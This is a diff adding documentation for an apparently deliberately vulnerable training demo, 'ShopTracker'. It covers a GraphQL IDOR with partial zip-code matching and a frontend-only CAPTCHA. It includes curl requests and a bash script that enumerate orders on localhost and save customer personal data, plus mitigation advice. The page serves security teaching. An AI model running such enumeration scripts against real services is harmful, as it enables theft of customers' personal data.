@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title><%= title %></title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #1e1e2e;
+      color: #cdd6f4;
+    }
+    .navbar {
+      background-color: #181825 !important;
+      border-bottom: 1px solid #313244;
+    }
+    .card {
+      background-color: #181825;
+      border: 1px solid #313244;
+    }
+    .card-header {
+      background-color: #11111b;
+      border-bottom: 1px solid #313244;
+    }
+    .alert-danger {
+      background-color: #f38ba8;
+      border-color: #f38ba8;
+      color: #11111b;
+    }
+    .alert-info {
+      background-color: #89b4fa;
+      border-color: #89b4fa;
+      color: #11111b;
+    }
+    .alert-warning {
+      background-color: #f9e2af;
+      border-color: #f9e2af;
+      color: #11111b;
+    }
+    code {
+      background-color: #313244;
+      color: #b4befe;
+      padding: 0.2rem 0.4rem;
+      border-radius: 3px;
+    }
+    pre {
+      background-color: #11111b;
+      border: 1px solid #313244;
+      border-radius: 6px;
+      padding: 1rem;
+      color: #cdd6f4;
+    }
+    .vulnerability-badge {
+      background-color: #f38ba8;
+      color: #11111b;
+      font-size: 0.75rem;
+      padding: 0.25rem 0.5rem;
+      border-radius: 3px;
+      text-transform: uppercase;
+      font-weight: bold;
+    }
+    .severity-critical {
+      background-color: #f38ba8;
+      color: #11111b;
+    }
+    .table-dark {
+      --bs-table-bg: #181825;
+      --bs-table-border-color: #313244;
+    }
+  </style>
+</head>
+<body>
+  <nav class="navbar navbar-expand-lg navbar-dark">
+    <div class="container">
+      <a class="navbar-brand" href="/demo2">
+        ShopTracker Documentation
+      </a>
+      <div class="navbar-nav ms-auto">
+        <a class="nav-link" href="/demo2">
+          [>] Launch Demo
+        </a>
+        <a class="nav-link" href="/">← Back to Demos</a>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container mt-4">
+    <div class="row">
+      <div class="col-12">
+        <!-- Table of Contents -->
+        <div class="card mb-4" style="border: 2px solid #89b4fa;">
+          <div class="card-header" style="background-color: #89b4fa;">
+            <h5 class="mb-0" style="color: #11111b;">
+              <i class="bi bi-list-ul me-2"></i>Table of Contents
+            </h5>
+          </div>
+          <div class="card-body">
+            <div class="row">
+              <div class="col-md-6">
+                <h6 class="text-primary">Core Vulnerabilities</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#graphql-idor" class="text-decoration-none">1. GraphQL Order Theft - Accessing ANY Customer Order</a></li>
+                  <li><a href="#captcha-bypass" class="text-decoration-none">2. CAPTCHA Bypass - Automated Mass Data Theft</a></li>
+                  <li><a href="#complete-exfiltration" class="text-decoration-none">3. Complete Customer Data Exfiltration</a></li>
+                </ul>
+                
+                <h6 class="text-primary mt-4">Attack Scenarios</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#competitor-intelligence" class="text-decoration-none">Competitor Intelligence</a></li>
+                  <li><a href="#identity-theft" class="text-decoration-none">Identity Theft</a></li>
+                </ul>
+              </div>
+              <div class="col-md-6">
+                <h6 class="text-primary">Technical Resources</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#mitigation" class="text-decoration-none">Mitigation Strategies</a></li>
+                  <li><a href="#testing-tools" class="text-decoration-none">Testing Tools</a></li>
+                  <li><a href="#sample-data" class="text-decoration-none">Sample Test Data</a></li>
+                </ul>
+                
+                <h6 class="text-primary mt-4">Quick Navigation</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#vulnerability-table" class="text-decoration-none">📊 Vulnerability Summary Table</a></li>
+                  <li><a href="#graphql-idor" class="text-decoration-none">🔓 Start with GraphQL IDOR</a></li>
+                  <li><a href="/demo2" class="text-decoration-none">🔍 Try the ShopTracker Demo</a></li>
+                  <li><a href="#sample-data" class="text-decoration-none">📋 Get Test Order Numbers</a></li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="card">
+          <div class="card-header">
+            <h4 class="mb-0">
+              [!] ShopTracker Security Documentation
+              <span class="vulnerability-badge severity-critical ms-2">Critical Severity</span>
+            </h4>
+          </div>
+          <div class="card-body">
+            
+            <!-- Overview -->
+            <div class="alert alert-danger">
+              <h6>WARNING: Vulnerability Overview</h6>
+              <p class="mb-0">ShopTracker is an e-commerce order tracking system that uses GraphQL to look up orders. This demo shows how <strong>weak validation</strong>, <strong>missing authorization</strong>, and <strong>CAPTCHA bypass</strong> can allow attackers to <strong>steal ANY customer's order information</strong> including personal details, addresses, phone numbers, and partial credit card data.</p>
+            </div>
+
+            <!-- Vulnerability Details -->
+            <h5 class="text-primary mb-3">Vulnerability Details</h5>
+            
+            <div class="table-responsive mb-4" id="vulnerability-table">
+              <table class="table table-dark table-striped">
+                <thead>
+                  <tr>
+                    <th>Vulnerability</th>
+                    <th>Severity</th>
+                    <th>Impact</th>
+                    <th>Location</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>GraphQL IDOR</td>
+                    <td><span class="badge bg-danger">Critical</span></td>
+                    <td>Access to any customer order</td>
+                    <td><code>/api/platform/sales</code></td>
+                  </tr>
+                  <tr>
+                    <td>Partial Zip Code Bypass</td>
+                    <td><span class="badge bg-danger">High</span></td>
+                    <td>Weakened authentication</td>
+                    <td>GraphQL resolver logic</td>
+                  </tr>
+                  <tr>
+                    <td>CAPTCHA Bypass</td>
+                    <td><span class="badge bg-warning">Medium</span></td>
+                    <td>Automated attacks</td>
+                    <td>GraphQL endpoint</td>
+                  </tr>
+                  <tr>
+                    <td>PII Information Disclosure</td>
+                    <td><span class="badge bg-danger">Critical</span></td>
+                    <td>Customer data breach</td>
+                    <td>Order query response</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+
+            <!-- Exploitation Guide -->
+            <h5 class="text-primary mb-3" id="exploitation-guide">Exploitation Guide</h5>
+
+            <!-- GraphQL IDOR -->
+            <div class="card mb-4" id="graphql-idor">
+              <div class="card-header">
+                <h6 class="mb-0">1. GraphQL Order Theft - Accessing ANY Customer Order</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>How Order Lookup Should Work:</strong> Customers enter their order number + full zip code to see their order. The system should verify they actually placed that order.</p>
+                
+                <p><strong>What's Actually Happening:</strong> The system just checks if the order number exists and if ANY part of the zip code matches. It doesn't verify that YOU placed the order - it shows whoever asks!</p>
+
+                <p><strong>The Double Problem:</strong></p>
+                <ul>
+                  <li><strong>Weak Zip Verification:</strong> You only need any partial of the zip code (like "0" for "90210" or "4" for "44333")</li>
+                  <li><strong>No Authorization:</strong> The system doesn't check if the order belongs to you</li>
+                </ul>
+
+                <p><strong>Step-by-Step Order Theft:</strong></p>
+                <ol>
+                  <li><strong>Learn the Pattern:</strong> Order numbers follow format R500160XXX (range 600-999)</li>
+                  <li><strong>Try Common Zip Prefixes:</strong> "0", "1", "2", "3", "4", "9" cover most US zip codes</li>
+                  <li><strong>Enumerate Orders:</strong> Try ~400 order numbers systematically (with realistic gaps)</li>
+                  <li><strong>Bypass CAPTCHA:</strong> GraphQL endpoint ignores CAPTCHA, allowing unlimited automation</li>
+                  <li><strong>Steal Everything:</strong> Get names, addresses, phones, payment info from ~280 valid orders</li>
+                </ol>
+
+                <p><strong>Simple Order Theft Attack:</strong></p>
+                <pre><code># Try a known order with minimal zip code
+curl -X POST "http://localhost:3000/api/platform/sales" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "{ order(number: \"R500160602\", zipcode: \"44\", guestToken: \"\") { email firstName lastName phone address1 city state lastFour } }"
+  }'
+
+# Success! You get back:
+{
+  "data": {
+    "order": {
+      "email": "ac-appsec03@acmecorp.com",
+      "firstName": "AcmeCorp", 
+      "lastName": "AppSec",
+      "phone": "555-0103",
+      "address1": "123 Security St",
+      "city": "Cleveland",
+      "state": "OH",
+      "lastFour": "1234"
+    }
+  }
+}</code></pre>
+
+                <p><strong>Mass Data Theft Script:</strong></p>
+                <pre><code># Steal hundreds of orders automatically
+for order_num in {600..650}; do
+  for zip_prefix in {1..9}; do
+    response=$(curl -s -X POST "http://localhost:3000/api/platform/sales" \
+      -H "Content-Type: application/json" \
+      -d "{\"query\": \"{ order(number: \\\"R5001606$order_num\\\", zipcode: \\\"$zip_prefix\\\", guestToken: \\\"\\\") { email firstName lastName phone address1 lastFour } }\"}")
+    
+    # Check if we got data back
+    if echo "$response" | grep -q "firstName"; then
+      echo "STOLEN ORDER R5001606$order_num:"
+      echo "$response" | jq .
+      echo "---"
+    fi
+  done
+done</code></pre>
+
+                <div class="alert alert-danger">
+                  <strong>What You Steal:</strong> Complete customer profiles including names, home addresses, phone numbers, email addresses, purchase history, and last 4 digits of credit cards. Perfect for identity theft.
+                </div>
+
+                <div class="alert alert-warning">
+                  <strong>Easy Fix:</strong> Require full zip codes (not partial). Implement proper authorization to verify the requesting user actually placed the order. Add rate limiting to prevent enumeration.
+                </div>
+              </div>
+            </div>
+
+            <!-- CAPTCHA Bypass -->
+            <div class="card mb-4" id="captcha-bypass">
+              <div class="card-header">
+                <h6 class="mb-0">2. CAPTCHA Bypass - Automated Mass Data Theft</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>The CAPTCHA Problem:</strong> ShopTracker shows a "I'm not a robot" CAPTCHA to prevent automated attacks. However, there's a critical flaw in how it's implemented.</p>
+                
+                <p><strong>How CAPTCHA Should Work:</strong> The frontend collects the CAPTCHA token, sends it to the server, and the server validates it before processing the request.</p>
+
+                <p><strong>What's Actually Happening:</strong> The GraphQL API endpoint doesn't check for CAPTCHA tokens at all! The CAPTCHA is only enforced by the frontend JavaScript, which attackers can completely bypass.</p>
+
+                <p><strong>Why This Is Dangerous:</strong></p>
+                <ul>
+                  <li><strong>No Rate Limiting:</strong> You can make thousands of requests per minute</li>
+                  <li><strong>Mass Enumeration:</strong> Automate attacks to steal hundreds/thousands of orders</li>
+                  <li><strong>Invisible to Monitoring:</strong> No failed CAPTCHA logs because the server never checks</li>
+                </ul>
+
+                <p><strong>CAPTCHA Bypass Attack:</strong></p>
+                <pre><code># The website shows a CAPTCHA, but you can completely ignore it:
+
+# Direct API attack bypassing all frontend protections
+curl -X POST "http://localhost:3000/api/platform/sales" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "{ order(number: \"R500160602\", zipcode: \"4\", guestToken: \"\") { email firstName lastName } }"
+  }'
+
+# Notice: No CAPTCHA token needed! The server doesn't check for it.
+
+# Scale this up to steal thousands of orders:
+for i in {600..999}; do
+  # No delays needed, no CAPTCHA to solve
+  curl -s -X POST "http://localhost:3000/api/platform/sales" \
+    -H "Content-Type: application/json" \
+    -d "{\"query\": \"{ order(number: \\\"R50016$i\\\", zipcode: \\\"4\\\", guestToken: \\\"\\\") { email firstName } }\"}"
+done</code></pre>
+
+                <p><strong>Comparison with Frontend:</strong></p>
+                <pre><code># What users see in browser (requires CAPTCHA):
+# 1. Fill out form
+# 2. Solve CAPTCHA  
+# 3. Click submit
+# 4. JavaScript sends request
+
+# What attackers do (bypasses CAPTCHA completely):
+# 1. Send direct GraphQL request to API
+# 2. No CAPTCHA needed
+# 3. Get all the data</code></pre>
+
+                <div class="alert alert-danger">
+                  <strong>Attack Scale:</strong> Without CAPTCHA protection, attackers can steal thousands of customer records in minutes. What should take hours with CAPTCHA solving now takes seconds.
+                </div>
+
+                <div class="alert alert-warning">
+                  <strong>Easy Fix:</strong> Validate CAPTCHA tokens on the server side. Never rely on frontend-only security. Implement rate limiting as a backup protection.
+                </div>
+              </div>
+            </div>
+
+            <!-- Complete Attack Chain -->
+            <div class="card mb-4" id="complete-exfiltration">
+              <div class="card-header">
+                <h6 class="mb-0">3. Complete Customer Data Exfiltration</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>Putting It All Together:</strong> Combining the partial zip bypass + CAPTCHA bypass + order enumeration = complete customer database theft.</p>
+                
+                <p><strong>What You Can Steal:</strong></p>
+                <ul>
+                  <li><strong>Personal Info:</strong> Full names, email addresses, phone numbers</li>
+                  <li><strong>Home Addresses:</strong> Complete billing and shipping addresses</li>
+                  <li><strong>Payment Info:</strong> Last 4 digits of credit cards</li>
+                  <li><strong>Purchase History:</strong> What people buy, how much they spend</li>
+                  <li><strong>Shipping Data:</strong> Tracking numbers, delivery status</li>
+                </ul>
+
+                <p><strong>Professional Data Theft Script:</strong></p>
+                <pre><code>#!/bin/bash
+# Professional customer data harvesting script
+
+echo "Starting ShopTracker customer data extraction..."
+echo "Target: All customer orders in database"
+echo "Method: GraphQL IDOR with partial zip bypass"
+echo
+
+# Output file for stolen data
+output_file="stolen_customer_data_$(date +%Y%m%d_%H%M%S).json"
+echo "Saving stolen data to: $output_file"
+
+# Initialize JSON array
+echo "[" > "$output_file"
+first_record=true
+
+# Try all order numbers with common zip prefixes (expanded range)
+# The system has orders from R500160600 to R500160999 (400 orders with gaps)
+for order_num in {600..999}; do
+  for zip_prefix in 0 1 2 3 4 5 6 7 8 9; do
+    
+    # GraphQL query to steal complete customer data
+    response=$(curl -s -X POST "http://localhost:3000/api/platform/sales" \
+      -H "Content-Type: application/json" \
+      -d "{
+        \"query\": \"{ 
+          order(number: \\\"R5001606$order_num\\\", zipcode: \\\"$zip_prefix\\\", guestToken: \\\"\\\") { 
+            number email zipcode firstName lastName fullName phone 
+            address1 address2 city state lastFour 
+            items { name price quantity } 
+            total status orderDate trackingNumber 
+          } 
+        }\"
+      }")
+    
+    # Check if we successfully stole data
+    if echo "$response" | jq -e '.data.order.email' >/dev/null 2>&1; then
+      echo "✓ STOLEN: Order R5001606$order_num (zip prefix: $zip_prefix)"
+      
+      # Add comma separator (except for first record)
+      if [ "$first_record" = false ]; then
+        echo "," >> "$output_file"
+      fi
+      first_record=false
+      
+      # Add stolen data to file
+      echo "$response" | jq '.data.order' >> "$output_file"
+      
+      # Break out of zip loop once we find a match
+      break
+    fi
+  done
+  
+  # Rate limiting (optional - not required due to no CAPTCHA)
+  sleep 0.1
+done
+
+# Close JSON array
+echo "]" >> "$output_file"
+
+echo
+echo "Data theft complete!"
+echo "Stolen customer records saved to: $output_file"
+echo "Note: Due to realistic gaps in order numbers, expect ~280 valid orders out of 400 attempts"
+echo "Use 'jq . $output_file' to view the stolen data"</code></pre>
+
+                <div class="alert alert-danger">
+                  <strong>Real-World Impact:</strong> This script can steal hundreds of complete customer profiles in minutes. The data includes everything needed for identity theft, credit fraud, and targeted attacks.
+                </div>
+
+                <div class="alert alert-warning">
+                  <strong>Complete Fix Required:</strong> 1) Implement proper user authentication 2) Validate full zip codes 3) Add server-side CAPTCHA validation 4) Implement rate limiting 5) Add audit logging for all order lookups
+                </div>
+              </div>
+            </div>
+
+
+            <!-- Attack Scenarios -->
+            <h5 class="text-primary mb-3">Attack Scenarios</h5>
+            
+            <div class="row">
+              <div class="col-md-6">
+                <div class="card mb-3" id="competitor-intelligence">
+                  <div class="card-header">
+                    <h6 class="mb-0">Competitor Intelligence</h6>
+                  </div>
+                  <div class="card-body">
+                    <p>Competitors could extract:</p>
+                    <ul>
+                      <li>Product pricing information</li>
+                      <li>Popular items and quantities</li>
+                      <li>Customer demographics</li>
+                      <li>Sales patterns and trends</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="card mb-3" id="identity-theft">
+                  <div class="card-header">
+                    <h6 class="mb-0">Identity Theft</h6>
+                  </div>
+                  <div class="card-body">
+                    <p>Criminals could use extracted data for:</p>
+                    <ul>
+                      <li>Account takeover attacks</li>
+                      <li>Social engineering campaigns</li>
+                      <li>Credit card fraud</li>
+                      <li>Address-based fraud</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Mitigation -->
+            <h5 class="text-primary mb-3" id="mitigation">Mitigation Strategies</h5>
+            
+            <div class="alert alert-warning">
+              <h6>CRITICAL FIXES REQUIRED</h6>
+              <ul class="mb-0">
+                <li><strong>Implement proper authorization:</strong> Validate user ownership of orders before returning data</li>
+                <li><strong>Strengthen zip code validation:</strong> Require full zip codes, not partial matches</li>
+                <li><strong>CAPTCHA validation:</strong> Implement server-side CAPTCHA verification for all endpoints</li>
+                <li><strong>Rate limiting:</strong> Implement aggressive rate limiting on GraphQL queries</li>
+                <li><strong>Query complexity analysis:</strong> Limit GraphQL query depth and complexity</li>
+                <li><strong>Data minimization:</strong> Only return necessary data fields</li>
+                <li><strong>Audit logging:</strong> Log all order lookup attempts for monitoring</li>
+                <li><strong>IP blocking:</strong> Implement automated blocking for suspicious activity</li>
+              </ul>
+            </div>
+
+            <!-- Testing Tools -->
+            <h5 class="text-primary mb-3" id="testing-tools">Testing Tools</h5>
+            
+            <div class="row">
+              <div class="col-md-6">
+                <div class="card">
+                  <div class="card-header">
+                    <h6 class="mb-0">GraphQL Testing</h6>
+                  </div>
+                  <div class="card-body">
+                    <ul class="list-unstyled">
+                      <li>[+] GraphQL Playground</li>
+                      <li>[+] Insomnia/Postman</li>
+                      <li>[+] graphql-voyager</li>
+                      <li>[+] GraphQL IDE</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="card">
+                  <div class="card-header">
+                    <h6 class="mb-0">Automated Testing</h6>
+                  </div>
+                  <div class="card-body">
+                    <ul class="list-unstyled">
+                      <li>[+] GraphQL Security Scanner</li>
+                      <li>[+] Burp Suite GraphQL extensions</li>
+                      <li>[+] Custom enumeration scripts</li>
+                      <li>[+] OWASP ZAP</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Sample Test Orders -->
+            <h5 class="text-primary mb-3" id="sample-data">Sample Test Data</h5>
+            
+            <div class="card">
+              <div class="card-header">
+                <h6 class="mb-0">Available Test Orders</h6>
+              </div>
+              <div class="card-body">
+                <div class="table-responsive">
+                  <table class="table table-dark table-sm">
+                    <thead>
+                      <tr>
+                        <th>Order Number</th>
+                        <th>Zip Code</th>
+                        <th>Customer</th>
+                        <th>Partial Zip Works</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><code>R500160602</code></td>
+                        <td>44333</td>
+                        <td>AcmeCorp AppSec</td>
+                        <td>44, 4</td>
+                      </tr>
+                      <tr>
+                        <td><code>R500160603</code></td>
+                        <td>10001</td>
+                        <td>John Doe</td>
+                        <td>10, 1</td>
+                      </tr>
+                      <tr>
+                        <td><code>R500160604</code></td>
+                        <td>90210</td>
+                        <td>Jane Smith</td>
+                        <td>90, 9</td>
+                      </tr>
+                      <tr>
+                        <td><code>R500160605+</code></td>
+                        <td>Various</td>
+                        <td>Generated data</td>
+                        <td>First 1-2 digits</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
